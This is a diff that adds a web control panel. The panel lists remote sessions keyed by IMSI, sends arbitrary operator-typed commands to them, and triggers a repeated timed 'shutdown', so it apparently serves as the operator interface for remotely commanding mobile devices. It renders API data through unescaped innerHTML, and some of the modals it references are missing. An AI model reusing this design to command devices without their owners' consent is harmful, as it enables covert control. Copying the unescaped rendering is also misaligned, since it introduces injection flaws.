@@ -1,0 +1,287 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Control Panel</title>
+  <style>
+    body {
+      font-family: sans-serif;
+      margin: 0;
+      padding: 0;
+      background-color: #f2f2f2;
+    }
+    .container {
+      width: 80%;
+      margin: 20px auto;
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(600px, 1fr));
+      gap: 20px;
+    }
+    .server-card {
+      background-color: #fff;
+      padding: 20px;
+      border-radius: 5px;
+      box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+    }
+    h3 {
+      margin-top: 0;
+    }
+    .info-row {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 15px;
+    }
+    .info-label {
+      font-weight: bold;
+    }
+    .info-value {
+      margin-left: 10px;
+    }
+    .status {
+      display: flex;
+      align-items: center;
+    }
+    .status-icon {
+      margin-right: 5px;
+    }
+    .status-text {
+      font-weight: bold;
+    }
+    .button-container {
+      display: flex;
+      justify-content: flex-end;
+      gap: 10px;
+    }
+    .button {
+      background-color: #4CAF50; /* Green */
+      border: none;
+      color: white;
+      padding: 10px 20px;
+      text-align: center;
+      text-decoration: none;
+      display: inline-block;
+      font-size: 16px;
+      cursor: pointer;
+      border-radius: 5px;
+    }
+    .button:hover {
+      background-color: #3e8e41;
+    }
+    .error-message {
+      color: red;
+      font-weight: bold;
+      text-align: center;
+    }
+    .dropdown {
+      position: relative;
+      display: inline-block;
+    }
+
+    .dropdown-button {
+      background-color: #4CAF50;
+      color: white;
+      padding: 10px 20px;
+      font-size: 16px;
+      border: none;
+      cursor: pointer;
+      border-radius: 5px;
+    }
+
+    .dropdown-button:hover {
+      background-color: #3e8e41;
+    }
+
+    /* Dropdown content styling */
+    .dropdown-content {
+      display: none;
+      position: absolute;
+      background-color: #f9f9f9;
+      min-width: 160px;
+      box-shadow: 0px 8px 16px rgba(0, 0, 0, 0.2);
+      z-index: 1;
+      border-radius: 5px;
+    }
+
+    .dropdown-content button {
+      color: black;
+      padding: 12px 16px;
+      text-decoration: none;
+      display: block;
+      width: 100%;
+      text-align: left;
+      background: none;
+      border: none;
+      cursor: pointer;
+    }
+
+    .dropdown-content button:hover {
+      background-color: #f1f1f1;
+    }
+    .dropdown:hover .dropdown-content {
+      display: block;
+    }
+
+  </style>
+</head>
+<body>
+  <div class="container" id="serverContainer">
+    <!-- Server panels will be dynamically inserted here -->
+  </div>
+  <p id="errorMessage" class="error-message"></p>
+
+  <script>
+    const apiEndpoint = '/api/getsessions';
+    const container = document.getElementById('serverContainer');
+    const errorMessage = document.getElementById('errorMessage');
+
+    // Fetch server data from the API
+    async function fetchServers() {
+      try {
+        const response = await fetch(apiEndpoint);
+        if (!response.ok) {
+          throw new Error(`API Error: ${response.statusText}`);
+        }
+        const data = await response.json();
+
+        // Parse server data
+        const servers = data.vms;
+        renderServers(servers);
+      } catch (error) {
+        errorMessage.textContent = `Failed to load server data: ${error.message}`;
+      }
+    }
+
+    // Render server cards
+    function renderServers(servers) {
+      container.innerHTML = ''; // Clear the container
+      Object.keys(servers).forEach(serverId => {
+        const server = servers[serverId];
+
+        const serverCard = document.createElement('div');
+        serverCard.className = 'server-card';
+
+        serverCard.innerHTML = `
+          <h3>Server ${serverId}</h3>
+          <div class="info-row">
+            <span class="info-label">Status:</span>
+            <span class="info-value status">
+              <span class="status-icon">✔️</span>
+              <span class="status-text" style="color: ${server.status === 'online' ? 'green' : 'red'};">${server.status}</span>
+            </span>
+          </div>
+          <div class="info-row">
+            <span class="info-label">Last Keepalive Received:</span>
+            <span class="info-value">${server.lastKeepalive} seconds ago</span>
+          </div>
+          <div class="info-row">
+            <span class="info-label">Connection:</span>
+            <span class="info-value">${server.conn}</span>
+          </div>
+          <div class="info-row">
+            <span class="info-label">CName:</span>
+            <span class="info-value">${server.canonicalName}</span>
+          </div>
+          <div class="button-container">
+            <div class="button-container">
+              <input type="text" id="firstexecdelay" name="firstexecdelay" value="60">
+              <input type="text" id="execdelays" name="execdelays" value="10">
+              <input type="text" id="repeats" name="repeats" value="10">
+              <button class="button refresh-button" onclick="fetchServers()">Refresh</button>
+              <div class="dropdown">
+                <button class="button dropdown-button">Actions</button>
+                <div class="dropdown-content">
+                  <button onclick="handleAction(${serverId}, 'shutdown')">Timed shutdown (instant)</button>
+                </div>
+              </div>
+            </div>
+          </div>
+        `;
+        container.appendChild(serverCard);
+      });
+    }
+
+    function sleep(ms) {
+      return new Promise(resolve => setTimeout(resolve, ms));
+    }
+
+    function openCommandModal(serverId) {
+      const modal = document.getElementById('commandModal');
+      const overlay = document.getElementById('overlay');
+      modal.style.display = 'block';
+      overlay.style.display = 'block';
+      modal.dataset.serverId = serverId;
+    }
+
+    function closeModal() {
+      const modal = document.getElementById('commandModal');
+      const overlay = document.getElementById('overlay');
+      modal.style.display = 'none';
+      overlay.style.display = 'none';
+    }
+
+    function openRPReplayModal(serverId) {
+      const modal = document.getElementById('rpreplayModal');
+      const overlay = document.getElementById('rpreplay-overlay');
+      modal.style.display = 'block';
+      overlay.style.display = 'block';
+      modal.dataset.serverId = serverId;
+    }
+
+    function closeRPReplayModal() {
+      const modal = document.getElementById('rpreplayModal');
+      const overlay = document.getElementById('rpreplay-overlay');
+      modal.style.display = 'none';
+      overlay.style.display = 'none';
+    }
+
+    function executeCommand() {
+      const modal = document.getElementById('commandModal');
+      const serverId = modal.dataset.serverId;
+      const command = document.getElementById('customCommandInput').value.trim();
+
+      if (!command) {
+        alert('Please enter a command.');
+        return;
+      }
+      let xhr = new XMLHttpRequest();
+      xhr.open('POST', `/api/postsender`);
+      xhr.setRequestHeader('Content-Type', 'application/json');
+      xhr.onload = function () {
+        if (xhr.status === 200) {
+          alert('Command executed successfully.');
+        } else {
+          alert(`Failed to execute command: ${xhr.responseText}`);
+        }
+        closeModal();
+      };
+      xhr.send(JSON.stringify({ imsi: serverId, cmd: command }));
+    }
+
+    function handleAction(serverId, action) {
+      alert(`Action "${action}" triggered for Server ${serverId}`);
+      let fexecdelay = document.getElementById("firstexecdelay").value
+      let execdelays = document.getElementById("execdelays").value
+      let repeats = document.getElementById("repeats").value
+      if (action == 'shutdown'){
+        let xhr = new XMLHttpRequest();
+        xhr.open('GET', `/api/querysender?imsi=${serverId}&cmd=ACTIONSHUTDOWN|${fexecdelay}|${execdelays}|${repeats}`);
+        xhr.send();
+      }
+    }
+
+
+    fetchServers()
+  </script>
+
+  <div id="commandModal" style="display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: white; padding: 20px; border-radius: 5px; box-shadow: 0 2px 5px rgba(0, 0, 0, 0.3); z-index: 1000;">
+    <h3>Custom Command Execution</h3>
+    <label for="customCommandInput">Command:</label>
+    <input type="text" id="customCommandInput" style="width: 100%; margin-bottom: 10px;" />
+    <div class="button-container">
+      <button class="button" onclick="executeCommand()">Execute</button>
+      <button class="button" onclick="closeModal()">Close</button>
+    </div>
+  </div>
+  <div id="overlay" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.5); z-index: 999;" onclick="closeModal()"></div>
+</body>
+</html>
